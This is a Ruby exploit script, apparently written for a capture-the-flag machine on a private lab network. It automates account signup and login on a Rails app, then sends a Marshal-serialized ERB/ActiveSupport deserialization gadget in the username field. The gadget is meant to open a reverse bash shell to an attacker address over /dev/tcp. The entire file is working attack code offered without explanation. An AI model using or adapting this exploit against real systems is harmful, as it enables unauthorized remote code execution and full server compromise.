require 'erb'
require 'rails/all'
require 'uri'
require 'net/http'
require 'nokogiri'

base_url = 'http://10.10.10.211:8080/'
uri = URI(base_url)

username = "usertest"
email = "usertest@test.com"
password = "test"

Net::HTTP.start(uri.host, uri.port) do |http|
    # Token
    token_url = URI(base_url + 'signup')
    request = Net::HTTP::Get.new token_url.request_uri
    response = http.request(request)
    doc = Nokogiri::HTML.parse(response.body)
    token = doc.xpath('//meta[@name="csrf-token"]/@content').first.value
    session_id = response['Set-Cookie'].split(';',2)[0]
    puts "Grab token"
    # Signup
    signup_url = URI(base_url + 'users')
    request = Net::HTTP::Post.new signup_url.request_uri

    data = {}
    data['utf8'] = 'âœ“'
    data['authenticity_token'] = token
    data['user[username]']= username
    data['user[email]']= email
    data['user[password]']= password
    data['commit']='Create User'

    request['Cookie'] = session_id
    request.set_form_data(data)

    response = http.request(request)

    if response.code == "200" or response.code == "302"
	puts "Created new user"
        # Login
        login_url = URI(base_url + 'login')
        request = Net::HTTP::Post.new login_url.request_uri

        request['Cookie'] = session_id

        data['session[email]'] =  email
        data['session[password]'] = password
        data['commit'] = 'Log in'
    
        request.set_form_data(data)
        response = http.request(request)

        if response.code == "302"
        	puts "Logged"
			redirect_url = URI(response['location'])
			redirect =  Net::HTTP::Get.new redirect_url.request_uri
        	redirect['Cookie'] = session_id
			response = http.request(redirect)
			
		if response.code == "200"
			puts "Redirect"

			doc = Nokogiri::HTML.parse(response.body)
    		user_id = doc.xpath('//li/a[@class="nav-link" and starts-with(@href,"/users/")]/@href').first
		
			# Edit
			edit_url = URI(base_url + user_id)
        	request = Net::HTTP::Post.new edit_url.request_uri
        	request['Cookie'] = session_id

			data.delete("user[email]")
			data.delete("user[password]")
			data.delete('session[email]')
			data.delete('session[password]')
        	data['_method'] = 'patch'
        	data['commit'] = 'Update User' 
	
        	# PAYLOAD
        	remote_code = "`bash -c 'bash -i >& /dev/tcp/10.10.15.10/9090 0>&1'`"

        	erb = ERB.allocate
        	erb.instance_variable_set(:@src, remote_code)
			erb.instance_variable_set(:@filename, "1")
        	erb.instance_variable_set(:@lineno, 1)
        	deprecation = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)
        	exploit_data = Marshal.dump(deprecation)

        	data['user[username]'] = exploit_data
        	request.set_form_data(data)
       
        	http.request(request)
        	http.request(request)

			articles_url = URI(base_url + '/articles')
			articles =  Net::HTTP::Get.new articles_url.request_uri
			articles['Cookie'] = session_id
            response = http.request(articles)

			puts "SHELL"
				end
			end    		
		end
	end
